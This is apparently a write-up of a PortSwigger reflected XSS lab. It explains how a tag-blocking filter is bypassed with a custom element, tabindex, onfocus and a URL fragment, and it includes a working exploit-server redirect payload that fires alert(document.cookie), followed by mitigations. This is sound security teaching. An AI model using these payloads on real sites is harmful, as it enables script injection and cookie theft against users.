# Lab 03: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-orange) ![Status](https://img.shields.io/badge/Status-Solved-brightgreen) ![Vulnerability](https://img.shields.io/badge/Vulnerability-Reflected%20XSS-red)

## 1. Lab Overview

This lab demonstrates a **Reflected Cross-Site Scripting (XSS)** vulnerability in an application that reflects user-controlled input directly into its HTML response.

Unlike conventional reflected XSS vulnerabilities, the application implements filtering that blocks standard HTML tags. This prevents straightforward attacks using elements such as:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

However, the filtering mechanism allows custom HTML elements. This creates an opportunity to inject a custom element and attach an event handler that executes JavaScript when the element receives focus.

The objective is to inject a custom HTML element that automatically triggers:

```javascript
alert(document.cookie)
```

The challenge is not simply injecting JavaScript. It is making the browser automatically execute the event handler without requiring the victim to interact with the page.

## 2. Understanding the Vulnerability

The application takes a search parameter from the URL and reflects it into the HTML response.

For example:

```html
<h1>0 search results for 'SEARCH_TERM'</h1>
```

The search term is inserted directly into the HTML document.

Since the application does not properly prevent attacker-controlled HTML from being interpreted by the browser, an attacker can inject HTML elements and event-handler attributes.

The application attempts to prevent this by blocking standard HTML tags. However, the filtering is incomplete because custom HTML elements are still accepted.

This creates a reflected XSS vulnerability.

## 3. Identifying the Injection Point

The first step was to inspect how the application handled the search parameter.

A normal search request looked similar to:

```http
GET /?search=Leooooooooo HTTP/2
```

The response contained:

```html
<h1>0 search results for 'Leooooooooo'</h1>
```

This confirmed that the search parameter was reflected into the HTML response.

Next, I tested different HTML elements to understand the filtering mechanism.

### Testing Standard HTML Tags

The application blocked standard HTML elements such as:

```html
<script>alert(1)</script>
```

However, custom-looking elements were accepted:

```html
<leo>
```

Additional tests included:

```html
<leo-element>
<my-element>
<custom-test>
```

These elements were reflected into the response without being blocked.

This revealed that the filtering mechanism did not adequately restrict custom HTML elements.

## 4. Understanding Custom HTML Elements

A custom HTML element is an element that uses a developer-defined tag name.

For example:

```html
<leo></leo>
```

Unlike standard HTML elements, custom elements can be registered and given custom behaviour using the browser's Custom Elements API.

However, registering a custom element is not necessary for this attack.

An unregistered custom element can still exist in the DOM and support applicable native HTML attributes and event handlers.

For example:

```html
<leo onclick="alert(1)">
```

The `onclick` handler can execute when the element is clicked.

The problem is that the victim would need to interact with the element.

Therefore, the next objective was to find an event that could execute automatically.

## 5. Understanding the Focus Event

The `focus` event occurs when an element receives focus.

For example:

```html
<leo onfocus="alert(1)">
```

The JavaScript executes when the element receives focus.

However, arbitrary custom elements are not normally focusable through keyboard navigation by default.

This is where the `tabindex` attribute becomes important.

### Understanding tabindex

The `tabindex` attribute determines whether an element can receive focus and how it participates in sequential keyboard navigation.

| Value | Behaviour |
|---|---|
| `tabindex="0"` | Makes an element focusable and includes it in the normal tab order. |
| `tabindex="1"` | Makes it focusable and places it in the positive tab order. |
| `tabindex="-1"` | Allows programmatic focus but excludes it from normal sequential Tab navigation. |

For this attack, the element needs to be focusable.

The following combination provides the required functionality:

```html
<leo id="x" tabindex="1" onfocus="alert(1)">
```

Breaking it down:

- `id="x"` gives the element a unique identifier.
- `tabindex="1"` makes the element focusable.
- `onfocus="alert(1)"` executes JavaScript when the element receives focus.

## 6. Understanding URL Fragments

The next challenge was triggering the focus event automatically.

This is achieved using a URL fragment.

Consider:

```text
https://example.com/page#x
```

The `#x` portion is called a URL fragment.

It identifies an element in the HTML document with:

```html
id="x"
```

When the browser navigates to a URL containing this fragment, it attempts to navigate to the corresponding element.

When the target element is focusable, fragment navigation can cause it to receive focus.

This can trigger its `onfocus` event.

For example:

```html
<leo id="x" tabindex="1" onfocus="alert(1)">
```

Navigating to:

```text
https://example.com/page#x
```

can automatically trigger:

```javascript
alert(1)
```

An important detail is that URL fragments are handled by the browser and are not included in the HTTP request sent to the server.

## 7. Testing the Injection in the Browser

Before constructing the final exploit, I tested the behaviour directly in the browser.

The injected element was:

```html
<leo id="x" tabindex="1" onfocus="alert(1)">
```

I inspected the DOM using Developer Tools and confirmed that the browser had created the element.

I also checked whether the element was registered as a custom element:

```javascript
customElements.get('leo-element');
```

The result was:

```javascript
undefined
```

This confirmed that the element was not registered as a custom element.

However, registration was unnecessary because the attack relied on the native focus event.

I then tested the element's focus behaviour using:

```javascript
document.querySelector('leo').focus();
```

I also inspected the currently focused element:

```javascript
document.activeElement;
```

After making the element focusable, I confirmed that it could receive focus.

Finally, I navigated to the URL containing `#x`.

The browser focused the injected element and executed its `onfocus` handler.

This confirmed the attack mechanism.

## 8. Constructing the Exploit

The final challenge was delivering the payload to the victim through the PortSwigger Exploit Server.

Initially, I attempted to use an iframe:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=PAYLOAD#x"></iframe>
```

However, this approach did not solve the lab.

The iframe creates a nested browsing context, and its behaviour can be affected by framing restrictions and focus behaviour.

The official solution uses JavaScript redirection instead.

### Final Exploit Server Payload

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cleo+id%3D%22x%22+tabindex%3D%221%22+onfocus%3D%22alert%28document.cookie%29%22%3E#x';
</script>
```

### Payload Breakdown

| Component | Purpose |
|---|---|
| `<script>` | Executes JavaScript on the exploit server page. |
| `location = 'URL'` | Redirects the victim's browser to the vulnerable application. |
| `search=` | Supplies the attacker-controlled search parameter. |
| `%3Cleo` | URL-encoded opening custom element tag. |
| `id="x"` | Identifies the injected element. |
| `tabindex="1"` | Makes the element focusable. |
| `onfocus="alert(document.cookie)"` | Executes JavaScript when the element receives focus. |
| `#x` | Navigates to the injected element using its ID. |

### Execution Flow

```text
Victim visits the Exploit Server
              |
              v
       JavaScript executes
              |
              v
     Browser redirects to target
              |
              v
   Vulnerable application reflects
        the injected HTML
              |
              v
      Custom element is created
              |
              v
       Browser processes #x
              |
              v
        Element receives focus
              |
              v
          onfocus executes
              |
              v
     alert(document.cookie)
```

The lab is solved when the victim's browser executes the injected JavaScript.

## 9. Why JavaScript Redirection Worked Instead of the Iframe

Both approaches attempt to navigate the victim to the vulnerable page, but they create different browsing contexts.

### Iframe Approach

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=PAYLOAD#x"></iframe>
```

The vulnerable page loads inside the exploit server page.

This creates a nested browsing context.

Potential obstacles include:

- The target application may prevent iframe embedding using `X-Frame-Options` or CSP `frame-ancestors`.
- Focus behaviour inside an iframe can differ from top-level navigation.
- The browser may not produce the expected focus transition.

### JavaScript Redirection Approach

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=PAYLOAD#x';
</script>
```

The browser navigates directly to the vulnerable application.

This avoids the need to embed the target page inside an iframe.

The target page becomes the top-level browsing context, and the browser processes the fragment navigation normally.

**Important:** An iframe is not inherently incapable of triggering this attack. It can work when framing is permitted and the necessary focus conditions are satisfied. The JavaScript redirection approach is more straightforward for this lab.

## 10. Vulnerability Analysis Using the Source-Sink-Context Method

| Component | Analysis |
|---|---|
| Source | `search` URL parameter |
| Sink | HTML response rendering the search parameter |
| Context | HTML element content inside an `<h1>` element |
| Injection | Custom HTML element |
| Event handler | `onfocus` |
| Focus mechanism | `tabindex` and URL fragment navigation |
| Execution | `alert(document.cookie)` |

### Why the Vulnerability Exists

The application reflects untrusted input into an HTML document without applying appropriate output encoding or sanitization.

Although the application blocks standard HTML tags, its filtering mechanism allows custom elements and event-handler attributes.

This means an attacker can still introduce executable JavaScript through HTML event handlers.

## 11. Mitigation

The primary defence against reflected XSS is to ensure that untrusted input is handled safely before it is included in a response.

Recommended security measures include:

1. **Context-aware output encoding:** Encode untrusted input according to the context in which it is inserted, preventing it from being interpreted as HTML or JavaScript.
2. **HTML sanitization:** If HTML input is intentionally supported, use a well-maintained HTML sanitization library with a strict allowlist of permitted elements and attributes.
3. **Avoid incomplete blacklists:** Blocking selected HTML tags is insufficient because attackers can use alternative elements and event handlers.
4. **Content Security Policy (CSP):** Apply a restrictive CSP as an additional security layer. Avoid relying on it as the primary XSS defence.
5. **Secure cookie configuration:** Set sensitive cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.

For this particular attack, setting the session cookie to `HttpOnly` prevents JavaScript from reading it through `document.cookie`. However, this does not eliminate the underlying XSS vulnerability.

## 12. Key Takeaways

This lab helped demonstrate several important browser and web security concepts:

- Reflected XSS can remain exploitable even when standard HTML tags are blocked.
- Custom HTML elements can be used as injection points.
- An unregistered custom element can still support applicable native HTML attributes and event handlers.
- The `onfocus` event executes when an element receives focus.
- The `tabindex` attribute makes otherwise non-focusable elements focusable.
- URL fragments can target elements through their IDs.
- Fragment navigation can be used to trigger focus automatically.
- JavaScript redirection and iframe embedding create different browsing contexts.
- Blacklist-based XSS protection is unreliable.
- Understanding the DOM, HTML parsing, event handling, and browser navigation is essential for exploiting and preventing XSS.

**The most important lesson:** Successful XSS exploitation is not just about injecting JavaScript. It also requires understanding how the browser parses HTML, creates DOM elements, manages focus, processes URL fragments, and executes event handlers.
